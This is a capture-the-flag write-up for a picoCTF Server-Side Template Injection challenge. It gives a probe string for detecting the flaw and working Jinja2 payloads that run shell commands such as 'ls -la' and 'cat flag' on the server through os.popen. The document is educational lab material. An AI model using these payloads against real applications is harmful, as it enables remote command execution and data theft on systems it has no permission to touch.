**Title:** SSTI (Server-Side Template Injection)

**Difficulty:** Easy

**Summary (TL;DR):**

Injecting payloads in Unsanitized input forms to access system files/Data.

**1. Scope & Setup**

**Target:** http://rescued-float.picoctf.net:PORT/

**Environment:** Local System/PicoCTF VM

**Tools used:** Browser

**2. Recon**

If you are like me and had no idea what to even do, we learn what SSTI is.

SSTI: Server Side Template Injection (SSTI) is a web security vulnerability where user input gets fed directly 
into a server-side template engine, letting an attacker inject template code and potentially execute unintended
commands on the server.


**3. Exploiting**

>**syntax to check Vulnarability:** 
```${{<%[%'"}}%\```

After some digging and trial and error, we learn that it is vulnerable to "{{syntax}}" syntax. Which is for Jinja2
<img width="834" height="484" alt="image" src="https://github.com/user-attachments/assets/fe7ac87b-0cc4-4107-b88a-666bffdeb1e2" />

>Proof is that {{7*7}} returns 49 instead of just printing it back.

**4. Post-Exploitation**

After Confirming what branch it belongs to, we use Python's OS module to gain our flag.
These are the commands I found working best after Trial and Error.

```  
{{url_for.__globals__.os.popen('pwd').read()}}      # print the directory we  are in
{{url_for.__globals__.os.popen('ls -la').read()}}   # list all files in the current directory
{{url_for.__globals__.os.popen('cat flag').read()}}     # Get content of flag
```
**5. FLAG**
 
``` picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533} ```

**6.Lessons & Mitigations**

Sanitize your form input!

**7.References / Credits**

https://redfoxsec.com/blog/a-guide-to-server-side-template-injection-ssti/

https://youtube.com/
